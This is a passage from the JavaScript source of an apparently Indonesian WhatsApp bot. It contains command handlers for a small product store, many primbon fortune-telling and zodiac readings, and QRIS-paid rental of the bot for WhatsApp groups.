const jumlahStok = parseInt(stockStr, 10)
if (!productName || isNaN(jumlahStok) || jumlahStok <= 0) {
ReplyRynzz('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah stok yang valid.')
} else {
const restockedProduct = ngerestokk(productName, jumlahStok)
if (restockedProduct) {
ReplyRynzz(`Stok produk "${restockedProduct.nama}" telah ditambahkan. Stok saat ini: ${restockedProduct.stok} unit.`)
} else {
ReplyRynzz(`Produk "${productName}" tidak ditemukan.`)
}}}
break

case 'beliproduk': {
if (isBan) return Xban()
await xreaction()
if (!text.includes(',')) return ReplyRynzz(`Contoh: ${XyrooRynzz} nama_produk, jumlah`)
const [productName, quantity] = args.join(' ').split(',').map(item => item.trim())
const jumlah = parseInt(quantity, 10)
if (!productName || isNaN(jumlah) || jumlah <= 0) {
return ReplyRynzz('Format tidak valid. Pastikan untuk memasukkan nama produk dan jumlah yang valid.')
}
const products = getprodukDariFile();
const product = products.find(p => p.nama.toLowerCase() === productName.toLowerCase())

if (!product) {
return ReplyRynzz(`Produk "${productName}" tidak ditemukan.`)}
if (product.stok < jumlah) {
return ReplyRynzz(`Stok untuk produk "${productName}" tidak mencukupi. Tersisa ${product.stok} unit.`)}
const discounts = getDisczz()
const discount = discounts.find(d => d.produk.toLowerCase() === product.nama.toLowerCase())
const totalHarga = discount ? discount.harga_diskon * jumlah : product.harga * jumlah
const transactionId = cIdTrnya()
ReplyRynzz(`
Kamu membeli ${jumlah} produk "${productName}"
Total harga: ${toRupiah(totalHarga)}

Silahkan transfer terlebih dahulu lalu
ketik ${Xyroo}payment untuk melihat metode pembayaran yang tersedia

Ketik ini...
${Xyroo}confirm ${transactionId}
${Xyroo}cancel ${transactionId}
`)
saveTrnye({
id: transactionId,
productName,
jumlah,
totalHarga,
status: 'process',
buyer: m.sender
})
product.stok -= jumlah
simpenProduknya(products)
}
break

case 'confirm': {
if (isBan) return Xban()
await xreaction()
const transactionId = text.trim().split(' ')[0]
if (!transactionId) return ReplyRynzz(`Contoh: ${XyrooRynzz} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return ReplyRynzz(`Transaksi dengan ID "${transactionId}" tidak ditemukan.`)
 }
if (transaction.status !== 'process') {
return ReplyRynzz('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer.')
}
transaction.status = 'success'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
ReplyRynzz(`Transaksi dengan ID "${transactionId}" telah berhasil dikonfirmasi.`)
}
break

case 'kensel': {
if (isBan) return Xban()
await xreaction()
const transactionId = text.trim().split(' ')[0]
if (!transactionId) return ReplyRynzz(`Contoh: ${XyrooRynzz} id_transaksi`)
const transaction = getTrId(transactionId)
if (!transaction) {
return ReplyRynzz(`Transaksi dengan ID "${transactionId}" tidak ditemukan`)
}
if (transaction.status !== 'process') {
return ReplyRynzz('ID transaksi tidak valid atau tidak dalam status menunggu bukti transfer')
}

const products = getprodukDariFile()
const product = products.find(p => p.nama.toLowerCase() === transaction.productName.toLowerCase())
if (product) {
product.stok += transaction.jumlah
simpenProduknya(products)
}
transaction.status = 'canceled'
simpenSmTr(getSmTr().map(t => t.id === transactionId ? transaction : t))
ReplyRynzz(`Transaksi dengan ID "${transactionId}" telah dibatalkan`)
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Store Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Primbon Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'nomerhoki': case 'nomorhoki': {
if (isBan) return Xban()
await xreaction()
if (!Number(text)) return ReplyRynzz(`Contoh : ${XyrooRynzz} 6288292024190`)
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} belanja`)
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodoh': case 'ramaljodoh': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005, Novia, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika Ardianta`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika|Novia`)
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return ReplyRynzz(anu.message)
Alice.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'jadianpernikahan': case 'jadiannikah': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 6, 12, 2020`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`)
}
break
case 'sifatusaha': {
if (isBan) return Xban()
await xreaction()
if (!text)return ReplyRynzz(`Contoh : ${prefix+ command} 28, 12, 2021`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`)
}
break
case 'rejeki': case 'rezeki': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': case 'kerja': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
Alice.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (isBan) return Xban()
await xreaction()
if (!text) return `Contoh : ${XyrooRynzz} Dika, 1, 2005\n\nNote : ${XyrooRynzz} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} DIka, 7, 7, 2005, 2022\n\nNote : ${XyrooRynzz} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'masasubur': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} 12, 1, 2022, 28\n\nNote : ${XyrooRynzz} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (isBan) return Xban()
await xreaction()
if (!text) return ReplyRynzz(`Contoh : ${XyrooRynzz} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return ReplyRynzz(anu.message)
ReplyRynzz(`• *Hasil :* ${anu.message}`)
}
break

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Primbon Fitur Batas!
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Gateway Fitur
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

case 'buysewa-1minggu': {
    if (!args[0]) {
        return reply(`Error! Silahkan Masukkan link group whatsapp\nExample: ${XyrooRynzz} https://chat.whatsapp.com`);
    }
    let requestAmount = 10000;
    let feeServer = Math.floor(Math.random() * 11);
    let nominal = requestAmount + feeServer;

    try {
        const pay = await createQRIS(nominal, `${orkut.codeqr}`);
        const expirationTime = new Date(pay.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const paymentInfo = `*PEMBAYARAN BUY SEWA 1 WEEK*\n\nMetode: e-Wallet (QRIS)\nReferensi: #${pay.transactionId}\nBerlaku hingga: ${timeLeft} menit (${formattedTime})\nBiaya Sewa Grup: ${formatmoney(requestAmount)}\nFee Server: ${formatmoney(feeServer)}\nTotal Pembayaran: ${formatmoney(nominal)}\n\nSilakan scan QRIS di atas untuk melanjutkan pembayaran.`;
        const qrisMessage = await Alice.sendMessage(m.chat, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

        let isTransactionComplete = false;

        while (!isTransactionComplete) {
            try {
                const merchant = `${orkut.merchant}`;
                const token = `${orkut.key}`;
                const response = await checkStatus(merchant, token);

                if (response && parseInt(response.amount) === parseInt(nominal)) {
                    isTransactionComplete = true;

                    if (qrisMessage.key) {
                        await Alice.sendMessage(from, { delete: qrisMessage.key });
                        reply(`Pembayaran berhasil. Bot akan segera masuk ke grup Anda.`);

                        const result = args[0].split('https://chat.whatsapp.com/')[1];
                        await Alice.groupAcceptInvite(result)
                            .then(() => reply('Berhasil bergabung ke grup!'))
                            .catch(() => reply('Gagal bergabung ke grup, pastikan link valid atau bot diizinkan bergabung.'));
                    }
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'buysewa-2minggu': {
    if (!args[0]) {
        return reply(`Error! Silahkan Masukkan link group whatsapp\nExample: ${XyrooRynzz} https://chat.whatsapp.com`);
    }
    let requestAmount = 15000;
    let feeServer = Math.floor(Math.random() * 11);
    let nominal = requestAmount + feeServer;

    try {
        const pay = await createQRIS(nominal, `${orkut.codeqr}`);
        const expirationTime = new Date(pay.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const paymentInfo = `*PEMBAYARAN BUY SEWA 2 WEEK*\n\nMetode: e-Wallet (QRIS)\nReferensi: #${pay.transactionId}\nBerlaku hingga: ${timeLeft} menit (${formattedTime})\nBiaya Sewa Grup: ${formatmoney(requestAmount)}\nFee Server: ${formatmoney(feeServer)}\nTotal Pembayaran: ${formatmoney(nominal)}\n\nSilakan scan QRIS di atas untuk melanjutkan pembayaran.`;
        const qrisMessage = await Alice.sendMessage(from, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

        let isTransactionComplete = false;

        while (!isTransactionComplete) {
            try {
                const merchant = `${orkut.merchant}`;
                const token = `${orkut.key}`;
                const response = await checkStatus(merchant, token);

                if (response && parseInt(response.amount) === parseInt(nominal)) {
                    isTransactionComplete = true;

                    if (qrisMessage.key) {
                        await Alice.sendMessage(from, { delete: qrisMessage.key });
                        reply(`Pembayaran berhasil. Bot akan segera masuk ke grup Anda.`);

                        const result = args[0].split('https://chat.whatsapp.com/')[1];
                        await Alice.groupAcceptInvite(result)
                            .then(() => reply('Berhasil bergabung ke grup!'))
                            .catch(() => reply('Gagal bergabung ke grup, pastikan link valid atau bot diizinkan bergabung.'));
                    }
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'buysewa-1bulan': {
    if (!args[0]) {
        return reply(`Error! Silahkan Masukkan link group whatsapp\nExample: ${XyrooRynzz} https://chat.whatsapp.com`);
    }
    let requestAmount = 20000;
    let feeServer = Math.floor(Math.random() * 11);
    let nominal = requestAmount + feeServer;

    try {
        const pay = await createQRIS(nominal, `${orkut.codeqr}`);
        const expirationTime = new Date(pay.expirationTime);
        const timeLeft = Math.max(0, Math.floor((expirationTime - new Date()) / 60000));
        const currentTime = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
        const expireTimeJakarta = new Date(currentTime.getTime() + timeLeft * 60000);
        const hours = expireTimeJakarta.getHours().toString().padStart(2, '0');
        const minutes = expireTimeJakarta.getMinutes().toString().padStart(2, '0');
        const formattedTime = `${hours}:${minutes}`;

        const paymentInfo = `*PEMBAYARAN BUY SEWA 1 Month*\n\nMetode: e-Wallet (QRIS)\nReferensi: #${pay.transactionId}\nBerlaku hingga: ${timeLeft} menit (${formattedTime})\nBiaya Sewa Grup: ${formatmoney(requestAmount)}\nFee Server: ${formatmoney(feeServer)}\nTotal Pembayaran: ${formatmoney(nominal)}\n\nSilakan scan QRIS di atas untuk melanjutkan pembayaran.`;
        const qrisMessage = await Alice.sendMessage(from, { image: { url: pay.qrImageUrl }, caption: paymentInfo }, { quoted: m });

        let isTransactionComplete = false;

        while (!isTransactionComplete) {
            try {
                const merchant = `${orkut.merchant}`;
                const token = `${orkut.key}`;
                const response = await checkStatus(merchant, token);

                if (response && parseInt(response.amount) === parseInt(nominal)) {
                    isTransactionComplete = true;

                    if (qrisMessage.key) {
                        await Alice.sendMessage(from, { delete: qrisMessage.key });
                        reply(`Pembayaran berhasil. Bot akan segera masuk ke grup Anda.`);

                        const result = args[0].split('https://chat.whatsapp.com/')[1];
                        await Alice.groupAcceptInvite(result)
                            .then(() => reply('Berhasil bergabung ke grup!'))
                            .catch(() => reply('Gagal bergabung ke grup, pastikan link valid atau bot diizinkan bergabung.'));
                    }
                }
            } catch (error) {
                console.error('Error memeriksa status transaksi:', error);
            }

            if (!isTransactionComplete) {
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    } catch (error) {
        console.error('Error membuat QRIS atau memeriksa status:', error);
        reply('Gagal membuat atau memeriksa pembayaran.');
    }
}
break;

case 'buysewa-2bulan': {
    if (!args[0]) {
